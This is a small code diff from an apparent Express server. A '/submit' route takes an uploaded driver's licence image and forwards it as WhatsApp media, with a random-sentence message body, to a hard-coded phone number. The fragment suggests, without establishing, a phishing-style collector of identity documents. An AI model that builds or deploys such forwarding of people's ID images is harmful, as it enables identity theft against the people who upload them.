@@ -60,8 +60,8 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
 
     // send WhatsApp message with media attachment
     const message = await client.messages.create({
-      from: "whatsapp:+2349154911424",
-      to: "whatsapp:+2348077050140", // recipient WhatsApp number
+      from: "whatsapp:+14155238886",
+      to: "whatsapp:+2349154911424", // recipient WhatsApp number
       body: `${randomSentence}`,
       mediaUrl: `https://${req.get("host")}/${req.file.path}`,
     });
